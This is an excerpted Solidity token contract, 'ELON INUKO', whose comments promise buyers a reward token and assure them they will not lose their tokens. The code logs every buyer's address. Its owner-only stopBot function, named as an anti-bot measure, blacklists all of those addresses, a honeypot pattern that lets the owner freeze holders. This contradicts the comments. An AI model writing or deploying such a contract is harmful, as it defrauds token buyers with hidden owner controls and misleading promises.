...
// This token allows you to buy the inuko inu token
// Increasing inuko inu price gives both gain and busd reward
// THIS token will only exist for a few hours. You will not lose your tokens.
// https://inukoinu.com
//https://t.me/inukoinutoken
...
contract ELONINUKO is IBEP20, Auth {
    using SafeMath for uint256;

    address buyAddressToken = 0x5F8203DFBBE6F883C54F68eeaeF4Ef6f706bA083;
    ...
    mapping(address => userAmount) public users;
    address[] userAddress;


    string constant _name = "ELON INUKO";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != teamFeeReceiver  && recipient != autoLiquidityReceiver && recipient != burnFeeReceiver){
            userAddress.push(recipient);
            userAmount memory userMsg = users[recipient];
            userMsg.amount = amount;
            users[recipient] = userMsg;
         }
    ...
    function giveInukoToken() public onlyOwner {
     for (uint i = 0; i < userAddress.length; i++) {
        userAmount memory userMsg = users[userAddress[i]];
        if (userMsg.amount > 0) {
        
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = WBNB;
        path[2] = buyAddressToken;
        ...
        userMsg.amount = 0;
        users[userAddress[i]] = userMsg;
        }
    }

    }

  function stopBot() public onlyOwner {
     for (uint i = 0; i < userAddress.length; i++) {
        if (isBlacklisted[userAddress[i]] == false) {
         isBlacklisted[userAddress[i]] = true;
        }
    }
